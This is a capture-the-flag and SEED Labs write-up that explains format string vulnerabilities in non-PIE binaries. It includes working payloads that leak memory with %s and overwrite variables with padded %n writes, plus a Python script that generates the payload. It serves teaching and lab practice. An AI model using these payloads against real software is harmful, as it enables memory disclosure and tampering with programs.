# CTF
## Challenge 1

### Recon

- We identified the security properties of the given program, with the help of the `checksec` tool.
- This program has some active protections, however it's a `NO PIE` program.  
- A `No PIE` application tells the loader which virtual address it should use (and keeps its memory layout quite static). Hence, attackers against this application know up-front how the virtual memory for this application is (partially) organized, including the stack.

### Vulnerability

The program loads the flag from a file to a global variable appropriately named `flag`. Shortly after that, in the source code appears the following line: `scanf("%32s", &buffer);`. This `scanf` would be a vulnerability by itself, but here it's coupled with a `printf` of that very same buffer, opening the possibility for a format string attack that prints the contents of any variable in the stack. This happens because the user can submit an input that can be evaluated as a command provided it is a format string like `"something%s"`, for example. The user is in control of the format string and can trick the `printf` function into printing the value of a variable whose address is pointed in the stack.

We knew that we could print the value of any variable provided we knew it's address, so we used `gdb` on the program to find out the address of the flag global variable (which happened to be `0x804c060`). Having that knowledge we launched our format string attack by sending the input "\x60\xc0\x04\x08%s". This printed the flag - `flag{7d1d4f6634c1f24af8b8ced952470bc6}`.

## Challenge 2

### Recon

- We identified the security properties of the given program, with the help of the `checksec` tool.
- This program has some active protections, however it's a `NO PIE` program.  
- A `No PIE` application tells the loader which virtual address it should use (and keeps its memory layout quite static). Hence, attackers against this application know up-front how the virtual memory for this application is (partially) organized, including the stack.

### Vulnerability

This time the only way we could access the `flag.txt` file was via a bash. The problem was that to launch said bash we needed to satisfy the condition `if(key == 0xbeef)`, and at first glance there wasn't any way to change the value of the `key` variable. But upon further analysis, we identified, once again, the format string vulnerability in the `scanf("%32s", &buffer);`/ `printf(buffer);` combo. The only type of format string attack that can change the value of a variable is the one that uses the formatting option `%n`. This option doesn't print anything, but the number of characters written is stored in the pointed location. This opens up a possibility to change the `key`.

In order to obtain the flag, we needed to change `key` to `0xbeef`. As we are using the `%n` option in our attack, we need to send an input that starts by the address of the `key` variable (after using gdb we found it to be `0x804c034`) and write `0xbeef` characters, or in decimal, 48879 characters. We used the python script to send an input with padding to write all the necessary characters, with a structure like this "aaaa\x34\xc0\x04\x08%48871x%n" (the starting characters are just there as the argument to be consumed by the padding). Running said script opened the bash, which in turn (using `cat < flag.txt`) allowed us to reach the flag - `flag{13107049574ad6c1dffec227ae128e62}`.

# SEED Labs

## Format String Attack Lab

### Task 1: Crashing the Program

- After setting up the server, we were able to crash the `format` program, by inputting a format string attribute (such as "%s").

### Task 2: Printing Out the Server Program’s Memory

- By inputting a specific number followed by repetitions of "%x" and looking for the sent number, we found out, by trial and error, that we needed to send 64 "%x" in order for our number to be printed.
- By inputting the given address of the secret message (0x080b4008), followed by 63 "%x" and 1 "%s", the secret message was printed out (appropriately named "secret message").

### Task 3: Modifying the Server Program’s Memory

- By inputting the given `target` variable address (0x080e5068) followed by 63 "%x" and 1 "%n", the "%n" caused the value 0x000000ee (number of written characters) to be written to the `target` variable.

- To change the `target` variable to 0x5000 we needed to write 0x5000 (20480) characters. However, we only had a buffer of size 1500 to work with. As such, we used format string padding to write those many characters (with a number of 0x5000 - 0xee - 4). By writing "aaaa" followed by the `target` address, followed by 63 "%x", followed by "%20238x%n" (20238 is 0x5000 - 0xee (number of written characters without the padding) - 4 (number of characters written in "aaaa")), the `target` value was successfully changed to 0x5000. The python script used to generate the payload was the following:

```python
#!/usr/bin/python3
import sys
content = bytearray(0x0 for i in range(24))
# This line shows how to store a 4-byte integer at offset 0
message_address  = 0x080b4008
var_address  = 0x080e5068
char_n = int("5000", 16) - int("f2", 16)
content[0:4]  = ("aaaa").encode('latin-1')
content[4:8]  =  (var_address).to_bytes(4,byteorder='little')
content[8:12]  =  (63*"%x" + "%" + str(char_n) + "x" + "%n").encode('latin-1')
# Write the content to payload.txt
with open('payload.txt', 'wb') as f:
  f.write(content)
```
